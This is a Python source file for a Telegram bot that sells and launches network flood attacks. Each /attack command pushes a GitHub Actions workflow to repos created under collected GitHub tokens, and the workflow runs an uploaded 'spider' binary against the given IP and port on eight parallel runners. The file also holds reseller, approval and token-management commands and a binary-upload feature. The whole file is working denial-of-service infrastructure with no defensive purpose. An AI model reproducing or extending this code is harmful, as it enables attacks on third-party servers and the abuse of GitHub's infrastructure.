import os
import json
import logging
import threading
import time
import random
import uuid
import asyncio
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException
from dotenv import load_dotenv

load_dotenv()

# ==================== CONFIG ====================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
OWNER_IDS = [int(x.strip()) for x in os.getenv("OWNER_IDS", "").split(",") if x.strip()]
COOLDOWN_DURATION = int(os.getenv("COOLDOWN_DURATION", 40))
MAX_ATTACKS = int(os.getenv("MAX_ATTACKS", 40))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN missing")

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== DATA PERSISTENCE ====================
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

def load_json(filename, default):
    path = os.path.join(DATA_DIR, filename)
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return default

def save_json(filename, data):
    path = os.path.join(DATA_DIR, filename)
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

owners = load_json("owners.json", {str(uid): {"username": f"owner_{uid}", "added_by": "system", "is_primary": True} for uid in OWNER_IDS})
save_json("owners.json", owners)

approved_users = load_json("approved_users.json", {})
pending_users = load_json("pending_users.json", [])
admins = load_json("admins.json", {})
resellers = load_json("resellers.json", {})
github_tokens = load_json("github_tokens.json", [])
user_attack_counts = load_json("user_attack_counts.json", {})
trial_keys = load_json("trial_keys.json", {})

# ==================== HELPERS ====================
def is_owner(uid): return str(uid) in owners
def is_admin(uid): return str(uid) in admins
def is_reseller(uid): return str(uid) in resellers
def is_approved(uid):
    u = str(uid)
    if u in approved_users:
        exp = approved_users[u].get('expiry')
        if exp == "LIFETIME" or time.time() < float(exp):
            return True
        else:
            del approved_users[u]
            save_json("approved_users.json", approved_users)
    return False

def can_attack(uid):
    return (is_owner(uid) or is_admin(uid) or is_reseller(uid) or is_approved(uid))

current_attack = None
cooldown_until = 0
attack_lock = threading.Lock()

def get_attack_status():
    global current_attack, cooldown_until
    if current_attack:
        now = time.time()
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": int(now - current_attack['start_time']),
            "remaining": max(0, int(current_attack['estimated_end_time'] - now))
        }
    if time.time() < cooldown_until:
        return {"status": "cooldown", "remaining_cooldown": int(cooldown_until - time.time())}
    return {"status": "ready"}

def start_attack(ip, port, duration, uid, method):
    global current_attack, cooldown_until
    with attack_lock:
        current_attack = {
            "ip": ip, "port": port, "time": duration, "user_id": uid,
            "method": method, "start_time": time.time(),
            "estimated_end_time": time.time() + int(duration)
        }
        u = str(uid)
        user_attack_counts[u] = user_attack_counts.get(u, 0) + 1
        save_json("user_attack_counts.json", user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    with attack_lock:
        current_attack = None
        cooldown_until = time.time() + COOLDOWN_DURATION

def stop_attack():
    global current_attack, cooldown_until
    with attack_lock:
        current_attack = None
        cooldown_until = time.time() + COOLDOWN_DURATION

# ==================== GITHUB ACTIONS ====================
def create_repo(token, repo_name):
    g = Github(token)
    user = g.get_user()
    try:
        repo = user.get_repo(repo_name)
        return repo, False
    except GithubException:
        repo = user.create_repo(repo_name, description=f"{repo_name} Bot", private=False, auto_init=False)
        return repo, True

def update_yml(token, repo_name, ip, port, duration):
    yml = f"""name: spider
on: [push]
jobs:
  spider:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {duration} 350
"""
    g = Github(token)
    repo = g.get_repo(repo_name)
    try:
        f = repo.get_contents(".github/workflows/main.yml")
        repo.update_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml, f.sha)
    except:
        repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml)

def instant_stop(token, repo_name):
    g = Github(token)
    repo = g.get_repo(repo_name)
    total = 0
    for status in ['queued', 'in_progress', 'pending']:
        for wf in repo.get_workflow_runs(status=status):
            try:
                wf.cancel()
                total += 1
            except:
                pass
    return total

# ==================== TELEGRAM COMMANDS ====================
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not can_attack(uid):
        if not any(str(u['user_id']) == str(uid) for u in pending_users):
            pending_users.append({"user_id": uid, "username": update.effective_user.username or f"user_{uid}", "request_date": time.strftime("%Y-%m-%d %H:%M:%S")})
            save_json("pending_users.json", pending_users)
        await update.message.reply_text("⏳ Access request sent. Wait for admin approval.")
        return
    await update.message.reply_text("✅ You have access. Use /attack <ip> <port> <time>")

async def attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not can_attack(uid):
        await update.message.reply_text("❌ No access.")
        return
    status = get_attack_status()
    if status["status"] == "running":
        await update.message.reply_text(f"🔥 Attack running: {status['attack']['ip']}:{status['attack']['port']} - {status['remaining']}s remaining")
        return
    if status["status"] == "cooldown":
        await update.message.reply_text(f"⏳ Cooldown: {status['remaining_cooldown']}s")
        return
    if len(ctx.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    if not github_tokens:
        await update.message.reply_text("❌ No GitHub tokens. Add via /addtoken")
        return
    ip, port, duration = ctx.args[0], int(ctx.args[1]), int(ctx.args[2])
    method = "VC FLOOD" if ip.startswith('91') else "BGMI FLOOD"
    if ip.startswith(('15','96')):
        await update.message.reply_text("❌ IP starting with 15 or 96 not allowed")
        return
    start_attack(ip, port, duration, uid, method)

    # Parallel update on all tokens
    def worker(tok):
        try:
            update_yml(tok['token'], tok['repo'], ip, port, duration)
            return True
        except:
            return False

    threads = [threading.Thread(target=worker, args=(t,)) for t in github_tokens]
    for t in threads: t.start()
    for t in threads: t.join()

    finish_attack()
    await update.message.reply_text(f"✅ Attack sent to {len(github_tokens)} repos.\n{ip}:{port} for {duration}s")

async def stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not can_attack(uid):
        await update.message.reply_text("❌ No access")
        return
    total = 0
    def worker(tok):
        return instant_stop(tok['token'], tok['repo'])
    threads = [threading.Thread(target=worker, args=(t,)) for t in github_tokens]
    for t in threads: t.start()
    for t in threads: t.join()
    stop_attack()
    await update.message.reply_text(f"🛑 Stopped all workflows across {len(github_tokens)} repos.")

async def status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not can_attack(uid):
        await update.message.reply_text("❌ No access")
        return
    st = get_attack_status()
    if st["status"] == "running":
        await update.message.reply_text(f"🔥 {st['attack']['ip']}:{st['attack']['port']} | {st['elapsed']}s elapsed | {st['remaining']}s left")
    elif st["status"] == "cooldown":
        await update.message.reply_text(f"⏳ Cooldown: {st['remaining_cooldown']}s")
    else:
        await update.message.reply_text("✅ Ready for attack")

async def addtoken(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owner only")
        return
    if not ctx.args:
        await update.message.reply_text("Usage: /addtoken <github_token>")
        return
    token = ctx.args[0]
    repo_name = random.choice(["spider","thor","hulk","ironman"]) + f"-{uuid.uuid4().hex[:8]}"
    try:
        g = Github(token)
        user = g.get_user()
        repo, _ = create_repo(token, repo_name)
        github_tokens.append({"token": token, "username": user.login, "repo": f"{user.login}/{repo_name}"})
        save_json("github_tokens.json", github_tokens)
        await update.message.reply_text(f"✅ Token added: {user.login} / {repo_name}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def tokens(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owner only")
        return
    if not github_tokens:
        await update.message.reply_text("No tokens")
        return
    msg = "📋 Tokens:\n" + "\n".join([f"- {t['username']} ({t['repo']})" for t in github_tokens])
    await update.message.reply_text(msg)

async def removetoken(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) or not ctx.args:
        await update.message.reply_text("Usage: /removetoken <index>")
        return
    try:
        idx = int(ctx.args[0]) - 1
        removed = github_tokens.pop(idx)
        save_json("github_tokens.json", github_tokens)
        await update.message.reply_text(f"✅ Removed: {removed['username']}")
    except:
        await update.message.reply_text("❌ Invalid index")

async def binary_upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owner only")
        return
    await update.message.reply_text("Send the binary file now.")
    return 1

async def handle_binary(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) or not update.message.document:
        await update.message.reply_text("❌ Invalid")
        return ConversationHandler.END
    file = await update.message.document.get_file()
    path = f"/tmp/binary_{uuid.uuid4().hex}.bin"
    await file.download_to_drive(path)
    with open(path, 'rb') as f:
        content = f.read()
    def upload(tok):
        try:
            g = Github(tok['token'])
            repo = g.get_repo(tok['repo'])
            try:
                existing = repo.get_contents("spider")
                repo.update_file("spider", "Update binary", content, existing.sha)
            except:
                repo.create_file("spider", "Upload binary", content)
            return True
        except:
            return False
    threads = [threading.Thread(target=upload, args=(t,)) for t in github_tokens]
    for t in threads: t.start()
    for t in threads: t.join()
    os.remove(path)
    await update.message.reply_text(f"✅ Binary uploaded to {len(github_tokens)} repos")
    return ConversationHandler.END

async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled")
    return ConversationHandler.END

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("addtoken", addtoken))
    app.add_handler(CommandHandler("tokens", tokens))
    app.add_handler(CommandHandler("removetoken", removetoken))

    conv = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", binary_upload)],
        states={1: [MessageHandler(filters.Document.ALL, handle_binary)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    app.add_handler(conv)

    logger.info("🚀 Bot is running on Railway...")
    app.run_polling()

if __name__ == "__main__":
    main()
